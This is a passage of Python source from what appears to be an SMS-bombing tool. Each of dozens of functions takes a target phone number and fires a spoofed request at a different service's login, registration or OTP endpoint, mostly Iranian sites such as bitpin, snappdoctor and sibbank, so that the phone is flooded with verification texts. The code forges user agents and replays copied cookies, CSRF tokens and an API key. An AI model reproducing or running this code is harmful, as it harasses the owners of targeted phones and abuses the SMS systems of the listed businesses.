            generate_user_agent()}
            get(url="https://okcs.com/users/mobilelogin?mobile=0" + phone, headers=rhead)

        def takshopaccessorise(phone):
            print_bomb('hierwh')
            n4 = {"mobile_phone": "0"+phone}
            post(url="https://takshopaccessorise.ir/api/v1/sessions/login_request",json=n4)

        def bitpin(phone):
            print_bomb('hierwh')
            n4 = {"phone": "0"+phone,"captcha_token": ""}
            rhead = {"content-type": "application/json","accept": "application/json, text/plain, */*","sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","user-agent":
            generate_user_agent(os="android"),"sec-ch-ua-platform": "\"Android\"","origin": "https://bitpin.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://bitpin.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7","content-length": "42","host": "api.bitpin.ir"}
            post(url="https://api.bitpin.ir/v1/usr/sub_phone/",json=n4, headers=rhead)

        def publisha(phone):
            print_bomb('hierwh')
            rhead = {"user-agent":
            generate_user_agent()}
            pubisha_request = "mobile=0"+phone
            pubisha_url = 'https://www.pubisha.com/login/checkCustomerActivation'
            post(pubisha_url, json=pubisha_request, headers=rhead)

        def wisgoon(phone):
            print_bomb('hierwh')
            post("https://gateway.wisgoon.com/api/v1/auth/login/",json={"phone": "0"+phone, "recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg","token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"}, headers={"Host": "gateway.wisgoon.com","content-length": "582","accept": "application/json","save-data": "on","user-agent":
            generate_user_agent(os="android"),"content-type": "application/json","origin": "https://m.wisgoon.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.wisgoon.com/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7", }, timeout=5)

        def snappdoctor(phone):
            print_bomb('hierwh')
            rhead = {"user-agent":
            generate_user_agent()}
            get(f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone}/sms?cCode=+98', headers=rhead, timeout=5)

        def tagmond(phone):
            print_bomb('hierwh')
            rhead = {"user-agent":
            generate_user_agent()}
            post('https://tagmond.com/phone_number', data='utf8=%E2%9C%93&phone_number=' +"0"+phone+'&g-recaptcha-response=', headers=rhead)

        def doctoreto(phone):
            print_bomb('hierwh')
            post('https://api.doctoreto.com/api/web/patient/v1/accounts/register', 
            json={"mobile": "0"+phone, "country_id": 205}, 
            headers={'Connection': 'keep-alive','Accept': 'application/json','X-Requested-With': 'XMLHttpRequest','User-Agent':
            generate_user_agent(os="win"),'Content-Type': 'application/json;charset=UTF-8','Origin': 'https://doctoreto.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://doctoreto.com/','Accept-Language': 'en-US,en;q=0.9'})

        def olgoo(phone):
            print_bomb('hierwh')
            olD = {'contactInfo[mobile]': '0'+phone,'contactInfo[agreementAccepted]': '1','contactInfo[teachingFieldId]': '1','contactInfo[eduGradeIds][7]': '7','submit_register': '1'}
            olU = 'https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox'
            olH = {'Accept': 'text/plain, */*; q=0.01','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Length': '163','Content-Type': 'application/x-www-form-urlencoded','Cookie': 'PHPSESSID=l1gv6gp0osvdqt4822vaianlm5','Host': 'www.olgoobooks.ir','Origin': 'https://www.olgoobooks.ir','Referer': 'https://www.olgoobooks.ir/sn/userRegistration/','X-Requested-With': 'XMLHttpRequest','user-agent':
            generate_user_agent(os="linux")}
            post(url=olU, headers=olH, data=olD).text

        def pakhsh(phone):
            print_bomb('hierwh')
            paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
            paU = 'https://www.pakhsh.shop/wp-admin/admin-ajax.php'
            paH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98; _wpfuuid=b21e7550-db54-469f-846d-6993cfc4815d','origin': 'https://www.pakhsh.shop','referer': 'https://www.pakhsh.shop/%D9%85%D8%B1%D8%A7%D8%AD%D9%84-%D8%AB%D8%A8%D8%AA-%D8%B3%D9%81%D8%A7%D8%B1%D8%B4-%D9%88-%D8%AE%D8%B1%DB%8C%D8%AF/','user-agent':
            generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
            post(url=paU, headers=paH, data=paD)

        def didnegar(phone):
            print_bomb('hierwh')
            paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
            paU = 'https://www.didnegar.com/wp-admin/admin-ajax.php'
            paH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'PHPSESSID=881f0d244b83c1db49d4c39e5fe7b108; digits_countrycode=98; _5f9d3331dba5a62b1268c532=true','origin': 'https://www.didnegar.com','referer': 'https://www.didnegar.com/my-account/?login=true&back=home&page=1','user-agent':
            generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
            post(url=paU, headers=paH, data=paD)

        def see5(phone):
            print_bomb('hierwh')
            seD = {'mobile': '0'+phone,'action': 'sendsms'}
            seU = 'https://crm.see5.net/api_ajax/sendotp.php'
            seH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '33','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': '_ga=GA1.2.1824452401.1639326535; _gid=GA1.2.438992536.1639326535; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; crisp-client%2Fsession%2Fc55c0d24-98fe-419a-862f-0b31e955fd59=session_812ec81d-13c1-4a69-a494-ad54e1f290ef; __utma=55084201.1824452401.1639326535.1639326540.1639326540.1; __utmc=55084201; __utmz=55084201.1639326540.1.1.utmcsr=Ads|utmgclid=EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE|utmccn=Exact-shopsaz|utmcmd=cpc|utmctr=(not%20provided); _gac_UA-62787234-1=1.1639326540.EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE; __utmt=1; __utmb=55084201.3.10.1639326540; WHMCSkYBsAa1NDZ2k=6ba6de855ce426e25ea6bf402d1dc09c','origin': 'https://crm.see5.net','referer': 'https://crm.see5.net/clientarea.php','user-agent':
            generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
            post(url=seU, headers=seH, data=seD)

        def ghabzino(phone):
            print_bomb('hierwh')
            ghJ = {"Parameters": {"ApplicationType": "Web","ApplicationUniqueToken": None,"ApplicationVersion": "1.0.0","MobileNumber": '0'+phone}}
            ghU = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
            ghH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json','origin': 'https://ghabzino.com','referer': 'https://ghabzino.com/','user-agent':
            generate_user_agent(os="linux")}
            get(url=ghU, headers=ghH, json=ghJ)

        def simkhan(phone):
            print_bomb('hierwh')
            ghJ = {"mobileNumber": '0'+phone,"ReSendSMS": False}
            ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
            ghH = {'Accept': 'application/json','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Authorization': 'Bearer undefined','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'www.simkhanapi.ir','Origin': 'https://simkhan.ir','Referer': 'https://simkhan.ir/','User-Agent':
            generate_user_agent(os="linux")}
            post(url=ghU, headers=ghH, json=ghJ)

        def drsaina(phone):
            print_bomb('hierwh')
            ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+phone}&confirmCode=&fullName=&Password=&Password2="
            ghU = 'https://www.drsaina.com/RegisterLogin?Returnurl=%2Fconsultation'
            ghH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','cookie': '.AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8NPBKm5eTodHlBQhmwjQAVWqg8-UO73YXzMYVhYk28IlZQexrnyEhYldxs2Ylnp3EZE2o3tccNQ0E7vRSUGVMNDfmcFOKPcUCG7sysT7unE5wui_vwzMvyCNDqIRZ1Wxd2AKD3s3lu-2BvFOXc_j7ts; anonymousId=-fmvaw07O1miRXbHtKTVT; segmentino-user={"id":"-fmvaw07O1miRXbHtKTVT","userType":"anonymous"}; _613757e830b8233caf20b7d3=true; _ga=GA1.2.1051525883.1639482327; _gid=GA1.2.2109855712.1639482327; __asc=bf42042917db8c3006a2b4dcf49; __auc=bf42042917db8c3006a2b4dcf49; analytics_token=a93f2bb1-30d0-4e99-18cc-b84fcda27ae9; yektanet_session_last_activity=12/14/2021; _yngt_iframe=1; _gat_UA-126198313-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_session_token=efcee442-344d-1374-71b8-60ca960029c9; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _gac_UA-126198313-1=1.1639482345.EAIaIQobChMImrmRrJvj9AIV2ZTVCh07_gUpEAAYASAAEgILoPD_BwE; cache_events=true','origin': 'https://www.drsaina.com','referer': 'https://www.drsaina.com/RegisterLogin?Returnurl=%2Fconsultation','upgrade-insecure-requests': '1','user-agent':
            generate_user_agent(os="linux")}
            post(url=ghU, headers=ghH, data=ghD).text

        def limome(phone):
            print_bomb('hierwh')
            liD = {'mobileNumber': phone,'country': '1'}
            liU = 'https://my.limoome.com/api/auth/login/otp'
            liH = {'Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Cookie': 'sess=00da3860-929a-4429-aef9-82bb64f9a439; basalam-modal=1','Host': 'my.limoome.com','Origin': 'https://my.limoome.com','Referer': 'https://my.limoome.com/login?redirectlogin=%252Fdiet%252Fpayment','User-Agent':
            generate_user_agent(os="linux"),'X-Requested-With': 'XMLHttpRequest'}
            post(url=liU, headers=liH, data=liD)

        def devsloop(phone):
            print_bomb('hierwh')
            n4 = f"number=0{phone}&state=number&"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8","User-Agent":
            generate_user_agent(os="android"), "Host": "i.devslop.app", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "Content-Length": "32"}
            post(url="https://i.devslop.app/app/ifollow/api/otp.php", headers=headers, data=n4)

        def hiword(phone):
            print_bomb('hierwh')
            rhead = {"user-agent":
            generate_user_agent()}
            n4 = {"identifier": "0"+phone}
            post(url="https://hiword.ir/wp-json/otp-login/v1/login", data=n4, headers=rhead)

        def behzadshami(phone): 
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone}&csrf=3b4194a8bb&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_%D9%81%DB%8C%D9%84%D8%AF%D9%85%D8%AA%D9%86%DB%8C1642498931181=Nvgu&digregcode=%2B98&digits_reg_mail={phone}&dig_otp=&code=&dig_reg_mail=&dig_nounce=3b4194a8bb"
            rhead = {'content-length': '142', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', 'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest', 'sec-ch-ua-mobile': '?1', 'user-agent':
            generate_user_agent(os="android"), 'sec-ch-ua-platform': '"Android"', 'origin': 'https://behzadshami.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'referer': 'https://behzadshami.com/my-account/', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7', 'cookie': 'digits_countrycode=98'}
            post(url="https://behzadshami.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)

        def ghasedak24(phone):
            print_bomb('hierwh')
            rhead = {"user-agent":
            generate_user_agent()}
            n4 = {"username": "0"+phone}
            post(url="https://ghasedak24.com/user/ajax_register", data=n4, headers=rhead)

        def iranketab(phone):
            print_bomb('hierwh')
            rhead = {"user-agent":
            generate_user_agent()}
            n4 = {"UserName": "0"+phone}
            post(url="https://www.iranketab.ir/account/register", data=n4, headers=rhead)

        def ketabchi(phone):
            print_bomb('hierwh')
            rhead = {"user-agent":
            generate_user_agent()}
            n4 = {"phoneNumber": "0"+phone}
            post(url="https://ketabchi.com/api/v1/auth/requestVerificationCode", data=n4, headers=rhead)

        def takfarsh(phone):
            print_bomb('hierwh')
            n4 = {"phone_email": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", data=n4, headers=rhead)
        def dadpardaz(phone):
            print_bomb('hierwh')
            n4 = {"mobile": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://dadpardaz.com/advice/getLoginConfirmationCode", data=n4, headers=rhead)
        def iranicard(phone):
            print_bomb('hierwh')
            n4 = {"mobile": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://api.iranicard.ir/api/v1/register", data=n4, headers=rhead)
        def pubgsell(phone):
            print_bomb('hierwh')
            rhead = {"user-agent":
            generate_user_agent()}
            post(url=f"https://pubg-sell.ir/loginuser?username=0{phone}", headers=rhead)
        def tj8(phone):
            print_bomb('hierwh')
            n4 = {"mobile": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://tj8.ir/auth/register", data=n4, headers=rhead)

        def mashinbank(phone):
            print_bomb('hierwh')
            n4 = {"mobileNumber": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://mashinbank.com/api2/users/check", data=n4, headers=rhead)
        def cinematicket(phone):
            print_bomb('hierwh')
            n4 = {"phone_number": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://cinematicket.org/api/v1/users/signup", data=n4, headers=rhead)
        def kafegheymat(phone):
            print_bomb('hierwh')
            n4 = {"phone": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://kafegheymat.com/shop/getLoginSms", data=n4, headers=rhead)

        def snappexpress(phone):
            print_bomb('hierwh')
            n4 = {"cellphone": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", data=n4, headers=rhead)

        def opco(phone):
            print_bomb('hierwh')
            n4 = {"telephone": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", data=n4, headers=rhead)

        def melix(phone):
            print_bomb('hierwh')
            n4 = {"mobile": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://melix.shop/site/api/v1/user/otp", json=n4, headers=rhead)
        def safiran(phone):
            print_bomb('hierwh')
            n4 = {"mobile": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://safiran.shop/login", json=n4, headers=rhead)
            

        def pirankalaco(phone):
            print_bomb('hierwh')
            head = {'accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '17','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://pirankalaco.ir','Referer': 'https://pirankalaco.ir/shop/login.php','Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','Sec-Ch-Ua-mobile': '?0','Sec-Ch-Ua-platform': 'Windows','Sec-Fetch-Dest': 'empty','User-Agent':
            generate_user_agent(os="win"),'X-Requested-with': 'XMLHttpRequest'}
            post(url="https://pirankalaco.ir/shop/SendPhone.php",data=f"phone=0{phone}",headers=head)
        def tnovin(phone):
            print_bomb('hierwh')
            head = {'accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '17','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Host': 'shop.tnovin.com','Origin': 'http://shop.tnovin.com','Referer': 'http://shop.tnovin.com/login','Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"','Sec-Ch-Ua-mobile': '?0','Sec-Ch-Ua-platform': 'Windows','Sec-Fetch-Dest': 'empty','User-Agent':
            generate_user_agent(os="win"),'X-Requested-with': 'XMLHttpRequest'}
            post(url="http://shop.tnovin.com/login",data=f"phone=0{phone}",headers=head)
        def dastakht(phone):
            print_bomb('hierwh')
            n4 = {"mobile": phone,"countryCode":98,"device_os":2}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://dastkhat-isad.ir/api/v1/user/store",json=n4, headers=rhead)
        def hamlex(phone):
            print_bomb('hierwh')
            n4 =  f"fullname=%D9%85%D9%85%D8%AF&phoneNumber=0{phone}&register="
            h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '61','Content-Type': 'application/x-www-form-urlencoded','Origin': 'https://hamlex.ir','Referer': 'https://hamlex.ir/register.php','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','User-Agent':
            generate_user_agent(os="win")}
            post(url="https://hamlex.ir/register.php",data=n4,headers=h4)
        def irwco(phone):
            print_bomb('hierwh')
            n4 =  f"mobile=0{phone}"
            h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '18','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://irwco.ir','Referer': 'https://irwco.ir/register','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent':
            generate_user_agent(os="win"),'X-Requested-Rith': 'XMLHttpRequest'}
            post(url="https://irwco.ir/register",data=n4,headers=h4)

        def moshaveran724(phone):
            print_bomb('hierwh')
            n4 =  f"againkey=0{phone}&cache=false"
            h4 = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Content-Length': '32','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Origin': 'https://moshaveran724.ir','Referer': 'https://moshaveran724.ir/user/register/','Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','Sec-Ch-Ua-Mobile': '?0','Sec-Ch-Ua-Platform': 'Windows','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','User-Agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://moshaveran724.ir/m/pms.php",data=n4,headers=h4)

        def sibbank(phone):
            print_bomb('hierwh')
            n4 = {"phone_number": "0" + phone}
            h4 = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.5','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.sibbank.ir','origin': 'https://sibbank.ir','referer': 'https://sibbank.ir/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','TE': 'trailers','user-agent':
            generate_user_agent(os="mac")}
            post(url="https://api.sibbank.ir/v1/auth/login",json=n4,headers=h4)    

        def steelalborz(phone):
            print_bomb('hierwh')
            n4 = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone}&csrf=2aae5b41f1&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone}&dig_otp=&code=&dig_reg_mail=&dig_nounce=2aae5b41f1'
            h4 = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://steelalborz.com','referer': 'https://steelalborz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fsteelalborz.com%2F','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://steelalborz.com/wp-admin/admin-ajax.php",data=n4,headers=h4)
            
        def arshian(phone):
            print_bomb('hierwh')
            n4 = {"country_code":"98","phone_number": phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://api.arshiyan.com/send_code",json=n4, headers=rhead)

        def topnoor(phone):
            print_bomb('hierwh')
            n4 = {"mobile":"0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://backend.topnoor.ir/web/v1/user/otp",json=n4, headers=rhead)

        def alinance(phone):
            print_bomb('hierwh')
            n4 =  {"phone_number":"0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://api.alinance.com/user/register/mobile/send/",json=n4, headers=rhead)
        def alopeyk(phone):
            print_bomb('hierwh')
            n4 = {"type":"CUSTOMER","model":"Chrome 104.0.0.0","platform":"pwa","version":"10","manufacturer":"Windows","isVirtual":False,"serial":True,"app_version":"1.2.6","uuid":True,"phone":"0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://api.alopeyk.com/api/v2/login?platform=pwa",json=n4, headers=rhead)

        def alopeyksafir(phone):
            print_bomb('hierwh')
            n4 = {'phone':'0'+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://api.alopeyk.com/safir-service/api/v1/login",json=n4, headers=rhead)   
        def chaymarket(phone):
            print_bomb('hierwh')
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone}&csrf=c832b38a97&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.chaymarket.com','referer': 'https://www.chaymarket.com/user/my-account/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://www.chaymarket.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
        def coffefastfoodluxury(phone):
            print_bomb('hierwh')
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone}&csrf=e23c15918c&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone}&dig_otp=&code=&dig_reg_mail=&dig_nounce=e23c15918c"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '248','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://coffefastfoodluxury.ir','referer': 'https://coffefastfoodluxury.ir/product-category/coffeshop/?login=true&page=1&redirect_to=https%3A%2F%2Fcoffefastfoodluxury.ir%2Fproduct-category%2Fcoffeshop%2F','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://coffefastfoodluxury.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)

        def dosma(phone):
            print_bomb('hierwh')
            n4 = {"username":"0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://app.dosma.ir/sendverify/",json=n4, headers=rhead)

        def ehteraman(phone):
            print_bomb('hierwh')
            n4 = {"mobile":"0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://api.ehteraman.com/api/request/otp",json=n4, headers=rhead)

        def mcishop(phone):
            print_bomb('hierwh')
            n4 = {"msisdn":phone}
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','clientid': '1006ee1c-790c-45fa-a86d-ac36846b8e87','content-length': '23','content-type': 'application/json','origin': 'https://shop.mci.ir','referer': 'https://shop.mci.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent':
            generate_user_agent(os="win")}
            post(url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",json=n4, headers=rhead)
        def hamrahbours(phone):
            print_bomb('hierwh')
            n4 = {"MobileNumber":"0"+phone}
            rhead = {'accept': 'application/json','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','ApiKey': '66a03e8e-fbc5-4b10-bdde-24c52488eb8bd6479050b','authorization': 'Bearer undefined','connection': 'keep-alive','content-length': '30','content-type': 'application/json','host': 'api.hbbs.ir','origin': 'https://app.hbbs.ir','referer': 'https://app.hbbs.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent':
            generate_user_agent(os="win")}
            post(url="https://api.hbbs.ir/authentication/SendCode",json=n4, headers=rhead)
        def homtick(phone):
            print_bomb('hierwh')
            n4 = {"mobileOrEmail":"0"+phone,"deviceCode":"d520c7a8-421b-4563-b955-f5abc56b97ec","firstName":"","lastName":"","password":""}
            rhead = {'user-agent':
            generate_user_agent()}
            post(url="https://auth.homtick.com/api/V1/User/GetVerifyCode",json=n4, headers=rhead)
        def iranamlaak(phone):
            print_bomb('hierwh')
            n4 = {"AgencyMobile":"0"+phone}
            rhead = {'user-agent':
            generate_user_agent()}
            post(url="https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",json=n4, headers=rhead)
        def karchidari(phone):
            print_bomb('hierwh')
            n4 = {"mobile":"0"+phone}
            rhead = {'user-agent':
            generate_user_agent()}
            post(url="https://api.kcd.app/api/v1/auth/login",json=n4, headers=rhead)
        def mazoo(phone):
            print_bomb('hierwh')
            n4 = {"phone":phone}
            rhead = {'user-agent':
            generate_user_agent()}
            post(url="https://mazoocandle.ir/login",json=n4, headers=rhead)
        def paymishe(phone):
